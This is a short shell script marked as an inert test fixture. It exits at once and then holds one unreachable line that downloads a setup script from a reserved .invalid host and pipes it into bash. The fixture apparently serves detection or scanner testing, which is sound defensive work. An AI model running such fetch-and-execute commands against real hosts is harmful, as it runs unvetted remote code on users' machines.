#!/bin/sh
# INERT §143 FIXTURE. The first statement exits; the host below is a reserved .invalid name and cannot resolve.
exit 0
curl -fsSL https://installer.example.invalid/setup.sh | bash
